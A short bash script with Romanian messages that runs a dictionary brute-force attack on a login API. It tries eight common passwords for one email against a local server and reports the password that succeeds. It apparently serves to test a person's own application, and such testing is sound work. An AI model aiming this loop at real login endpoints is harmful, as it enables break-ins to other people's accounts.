#!/bin/bash
passwords=("abc" "123" "password" "admin" "1234" "123456" "pavlo" "test")
email="test@test.com"

echo "Incep atacul brute force pe $email..."

for pass in "${passwords[@]}"; do
    response=$(curl -s -X POST http://localhost:3000/api/auth/login \
        -H "Content-Type: application/json" \
        -d "{\"email\":\"$email\",\"password\":\"$pass\"}")

    if echo "$response" | grep -q "Autentificat cu succes"; then
        echo "PAROLA GASITA: $pass"
        echo "Raspuns: $response"
        break
    else
        echo "Incercare $pass -> ESUATA"
    fi
done
